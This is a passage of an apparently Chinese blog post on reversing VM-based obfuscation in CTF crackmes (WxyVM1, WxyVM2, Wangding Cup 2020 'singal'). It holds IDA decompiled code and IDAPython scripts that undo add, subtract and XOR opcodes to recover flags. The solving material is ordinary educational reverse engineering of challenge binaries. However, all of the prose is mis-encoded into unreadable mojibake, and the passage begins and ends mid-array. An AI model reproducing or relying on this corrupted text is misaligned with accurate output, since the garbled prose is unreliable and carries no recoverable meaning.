class="number">0x6</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x26</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x7</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x27</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x28</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x29</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xa</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2a</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xb</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xc</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf1</span>,<span class="number">0xe4</span>,<span class="number">0x2c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œä¸€ä¸ªç®€åŒ–ç‰ˆçš„å°å‹è™šæ‹Ÿæœºå°±å®ç°å®Œäº†ã€‚è¯¥è™šæ‹Ÿæœºå®ç°äº†å¯¹è¾“å…¥å­—ç¬¦ä¸²ç®€å•çš„å¼‚æˆ–åŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„å€¼å­˜å‚¨åˆ°æŒ‡å®šä½ç½®ã€‚</p><p>ç”¨gccç¼–è¯‘ä¸€ä¸‹å°±å¯ä»¥åœ¨idaä¸Šè‡ªå·±é€†ç€ç©ï¼ˆæ²¡æƒ³åˆ°æ„å¤–çš„å­¦ä¼šäº†vmreæ€ä¹ˆå‡ºé¢˜ï¼‰</p><h2 id="0x03-ctf-vmé€†å‘æ€è·¯"><a href="#0x03-ctf-vmé€†å‘æ€è·¯" class="headerlink" title="0x03 ctf vmé€†å‘æ€è·¯"></a>0x03 ctf vmé€†å‘æ€è·¯</h2><p>äº†è§£äº†ä¸Šè¿°çŸ¥è¯†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ctfä¸­vmé€†å‘çš„æ€è·¯</p><p>è¿™é‡Œå€Ÿç”¨ä¸€ä½å¤§ä½¬çš„æ€»ç»“</p><blockquote><p>è§£é¢˜ä¸€èˆ¬æ­¥éª¤ï¼š</p><p>åˆ†æVMç»“æ„-&gt;åˆ†æopcode-&gt;ç¼–å†™parser-&gt;reç®—æ³•</p><p>VMç»“æ„å¸¸è§ç±»å‹ï¼š</p><p>åŸºäºæ ˆã€åŸºäºé˜Ÿåˆ—ã€åŸºäºä¿¡å·é‡</p><p>opcodeï¼š</p><p>ä¸VMæ•°æ®ç»“æ„å¯¹åº”çš„æŒ‡ä»¤ ï¼špush pop</p><p>è¿ç®—æŒ‡ä»¤ï¼šaddã€subã€mul</p></blockquote><h2 id="0x04-ctfå®æˆ˜"><a href="#0x04-ctfå®æˆ˜" class="headerlink" title="0x04 ctfå®æˆ˜"></a>0x04 ctfå®æˆ˜</h2><p>çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼ŒæŒæ¡äº†vmè™šæ‹Ÿæœºä¿æŠ¤çš„æ ¸å¿ƒç§‘æŠ€ã€‚åšå‡ ä¸ªctfé¢˜ç›®æ¥å®è·µä¸€ä¸‹ã€‚å…ˆæ¥çœ‹çœ‹å—é‚®CTFç»å…¸çš„ä¸¤é“vmé€†å‘ï¼ˆ WxyVM1 WxyVM2ï¼‰</p><h3 id="WxyVM1"><a href="#WxyVM1" class="headerlink" title="WxyVM1"></a>WxyVM1</h3><p>å…ˆæŸ¥å£³ï¼Œæ–‡ä»¶ä¸ºæ— å£³64ä½æ–‡ä»¶ åç¼–è¯‘mainå‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WxyVM 0.0.1]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;byte_604B80);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sub_4005B6</span>();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;byte_604B80) != <span class="number">24</span> )</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;byte_604B80 + i) != dword_601060[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°é€»è¾‘éå¸¸ç®€å• flagç»è¿‡sub_4005B6çš„å¤„ç†ä¹‹å ä¸dword_601060[i] è¿›è¡ŒåŒ¹é…ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠsub_4005B6ç ”ç©¶æ˜ç™½å°±å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_ invoke__">sub_4005B6</span>()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  char v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = byte_6010C0[i + <span class="number">2</span>];</span><br><span class="line">    v3 = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">    result = (unsigned <span class="keyword">int</span>)byte_6010C0[i];</span><br><span class="line">    <span class="keyword">switch</span> ( byte_6010C0[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) += v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) -= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) ^= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) *= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + v3) ^= *(&amp;byte_604B80 + byte_6010C0[i + <span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4005B6()å‡½æ•°é‡Œä¹Ÿæœ‰ä¸€ä¸ªå·²çŸ¥æ•°ç»„byte_6010C0ï¼Œbyte_6010C0æ•°ç»„ä¸‰ä½ä¸ºä¸€ç»„ï¼Œç¬¬ä¸€ä½æŒ‡ç¤ºæ“ä½œï¼Œç¬¬äºŒä½æŒ‡ç¤ºè¾“å…¥çš„å“ªä¸€ä½è¿›è¡Œæ“ä½œï¼Œç¬¬ä¸‰ä½æŒ‡ç¤ºæ“ä½œæ•°ã€‚è§‚å¯Ÿå‘ç°byte_6010C0æ•°ç»„ç¬¬ä¸€ä½åªæœ‰1, 2,  3ï¼Œæ‰€ä»¥åªä¼šå­˜åœ¨å‰ä¸‰ç§è¿ç®—ï¼Œå³åŠ å‡å¼‚æˆ–ï¼Œè¿™éƒ½æ˜¯å¾ˆå¥½é€†çš„ç®—æ³•ã€‚ç”±äºbyte_6010C0æ•°ç»„è¿‡å¤§ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸å¯¼å‡ºç›´æ¥åˆ©ç”¨idapythonçš„æ–¹å¼ç›´æ¥re</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 import * <span class="comment">//IDA7.5+éœ€è¦å¼•å…¥è¯¥åº“ä¸ç„¶ä¼šæŠ¥é”™</span></span><br><span class="line">arr = [<span class="number">4294967236</span>, <span class="number">52</span>, <span class="number">34</span>, <span class="number">4294967217</span>, <span class="number">4294967251</span>, <span class="number">17</span>, <span class="number">4294967191</span>, <span class="number">7</span>, <span class="number">4294967259</span>, <span class="number">55</span>, <span class="number">4294967236</span>, <span class="number">6</span>, <span class="number">29</span>, <span class="number">4294967292</span>, <span class="number">91</span>, <span class="number">4294967277</span>, <span class="number">4294967192</span>, <span class="number">4294967263</span>, <span class="number">4294967188</span>, <span class="number">4294967256</span>, <span class="number">4294967219</span>, <span class="number">4294967172</span>, <span class="number">4294967244</span>, <span class="number">8</span>]</span><br><span class="line">addr = <span class="number">0x6010c0</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(arr)):</span><br><span class="line">    arr[i] &amp;= <span class="number">0xffffffff</span> </span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">14997</span>,-<span class="number">1</span>,-<span class="number">3</span>):</span><br><span class="line">    v0 = <span class="title function_ invoke__">Byte</span>(addr + i)</span><br><span class="line">    v3 = <span class="title function_ invoke__">Byte</span>(addr + i + <span class="number">2</span>)</span><br><span class="line">    result = <span class="title function_ invoke__">Byte</span>(addr + i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">1</span>:</span><br><span class="line">        arr[result] -= v3</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">2</span>:</span><br><span class="line">        arr[result] += v3</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">3</span>:</span><br><span class="line">        arr[result] ^= v3</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(arr)):</span><br><span class="line">    arr[i] &amp;= <span class="number">0xff</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">map</span>(chr, arr)))</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flag</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d416869e47726660851b7715084efb57fdfbcd8d.png" alt="image.png"></p><h3 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h3><p>è€ƒå¯Ÿå»èŠ±æŒ‡ä»¤</p><p>åŒæ ·çš„æ— å£³64ä½ã€‚è¿™æ¬¡åç¼–è¯‘mainå‡½æ•°çš„æ—¶å€™å‡ºé—®é¢˜äº†</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2cfeb8f8c9e60063e9f2188272f8db1263a9d4ef.png" alt="image.png"></p><p>ç™¾åº¦æœç´¢äº†ä¸€æ³¢æ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹idaä¸­çš„cfgæ–‡ä»¶å¤¹ä¸‹çš„hexrays.cfgä¸­çš„ </span><br><span class="line">MAX_FUNCSIZE= <span class="number">1024</span>(<span class="number">64</span>æ”¹ä¸º<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8182e8cb487a274144d7cbe87951ea3833a8dc95.png" alt="image.png"></p><p>è€å¿ƒç­‰å¾…â€¦è®©å­å¼¹é£ä¸€ä¼šå„¿ã€‚è¿›å»ä¼šçœ‹åˆ°å¤§é‡çš„ä¼ªä»£ç ã€‚åƒä¸‡ä¸è¦è¢«è¿™ä¸¤ä¸‡å¤šè¡Œçš„ä»£ç å“ä½äº†ï¼ˆç¡®å®å¾ˆå“äººï¼‰æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿä¸€ä¸‹æœ«å°¾çš„å¾ªç¯å‘ç°ï¼Œç”±äºçš„å¾ªç¯é•¿åº¦åªæœ‰24ï¼Œdwordçš„åœ°å€è¿œè¿œè¶…å‡ºäº†è¿™ä¸ªèŒƒå›´ã€‚æ‰€ä»¥dwordæ•°æ®çš„è®¡ç®—ï¼Œå…¶å®å½±å“ä¸åˆ°æœ€åçš„ç»“æœã€‚byteçš„è®¡ç®—æ‰æ˜¯æˆ‘ä»¬è¿™é¢˜çœŸæ­£çš„ç®—æ³•æ‰€åœ¨ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9cecbcb89001c2122527e470a348a4f0ffe4f91b.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨idaè„šæœ¬å»èŠ±ã€‚åªä¿ç•™byteçš„ç›¸å…³è®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file_1 = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = file_1.read()</span><br><span class="line">s = s.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">s = s.replace(<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">s=s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#å»é™¤ç©ºæ ¼</span></span><br><span class="line">a = s.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[::-<span class="number">1</span>]: <span class="comment">#é€†å‘ç®—æ³•</span></span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        ss += i + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">file_1.close()</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;$&#x27;</span>) <span class="comment">#é€†å‘åŠ å‡æ³•</span></span><br><span class="line">ss = ss.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">ss = ss.replace(<span class="string">&#x27;byte_&#x27;</span>,<span class="string">&#x27;arr[&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">71</span>,<span class="number">1</span>): <span class="comment">#å¤§å†™å˜å°å†™</span></span><br><span class="line">    ss = ss.replace(<span class="built_in">chr</span>(i),<span class="built_in">chr</span>(i+<span class="number">32</span>))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    ss = ss.replace(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">0x694100</span>+i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">file_2 = <span class="built_in">open</span>(<span class="string">&#x27;flag2.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file_2.write(ss)</span><br><span class="line">file_2.close()</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œæ¨èemeditor æ­£åˆ™åŒ¹é…çš„åŠŸèƒ½ç›¸å½“å®Œå–„ã€‚å¤„ç†å¤§æ‰¹é‡æ•°æ®ä¸å¡é¡¿ã€‚æœ€åå°†å¤„ç†è¿‡çš„æ•°æ®è¾“å‡ºå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">4294967232</span>, <span class="number">4294967173</span>, <span class="number">4294967289</span>, <span class="number">108</span>, <span class="number">4294967266</span>, <span class="number">20</span>, <span class="number">4294967227</span>, <span class="number">4294967268</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">4294967176</span>, <span class="number">110</span>, <span class="number">4294967195</span>, <span class="number">4294967242</span>, <span class="number">4294967226</span>, <span class="number">92</span>, <span class="number">55</span>, <span class="number">4294967295</span>, <span class="number">72</span>, <span class="number">4294967256</span>, <span class="number">31</span>, <span class="number">4294967211</span>, <span class="number">4294967205</span>]</span><br><span class="line"><span class="comment">#è¿™é‡Œæ˜¯ç›´æ¥å¤åˆ¶è¿‡æ»¤åçš„æ–‡ä»¶ å¤ªé•¿äº†è¿™é‡Œå°±ä¸æ”¾ä¸Šäº†</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">print</span>(<span class="title function_ invoke__">chr</span>(arr[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-singal"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-singal" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal</h3><p>å‰ä¸¤é“é¢˜ç›®æ„Ÿè§‰è¿˜æ˜¯ç¼ºç‚¹vmçš„å‘³é“ã€‚åº”è¯¥æ˜¯é¢˜ç›®ç®€å•çš„åŸå› å§ã€‚æ¥ä¸‹æ¥ç½‘é¼æ¯çš„è¿™é“é¢˜ç›®æ‰çœŸçš„å¼€å§‹æœ‰å†…å‘³äº†ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2fe1ad58877a23061374cf2b26c12324db995454.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, &amp;unk_403040, <span class="number">0x1C8</span>u);</span><br><span class="line">  vm_operad(v4, <span class="number">114</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘ä¸€ä¸‹mainå‡½æ•°ã€‚å‘ç°æœ¬é¢˜æ˜¯ä¸€é“æ ‡å‡†çš„vmé€†å‘ã€‚å…ˆæ ¹æ®æˆ‘ä»¬æ€»ç»“è¿‡çš„vmé€†å‘æ€è·¯ï¼Œå†™ä¸ªè„šæœ¬æå–å‡ºoperad_code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 import *</span><br><span class="line">start_addr=<span class="number">0x403040</span></span><br><span class="line">alist=[]</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">114</span>):</span><br><span class="line">    t=<span class="title function_ invoke__">Dword</span>(start_addr)</span><br><span class="line">    alist.<span class="title function_ invoke__">append</span>(t)</span><br><span class="line">    start_addr+=<span class="number">4</span></span><br><span class="line"><span class="keyword">print</span>(alist)</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">len</span>(alist))</span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a4f459a2fdf67661e4fb4ea7687e3ca3c9ca3ae6.png" alt="image.png"></p><p>æ•´ç†ä¸€ä¸‹è·å–çš„æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">op_code=[<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,</span><br><span class="line"><span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,</span><br><span class="line"><span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">4294967207</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">4294967281</span>,<span class="number">7</span>,</span><br><span class="line"><span class="number">40</span>,<span class="number">7</span>,<span class="number">4294967172</span>,<span class="number">7</span>,<span class="number">4294967233</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span 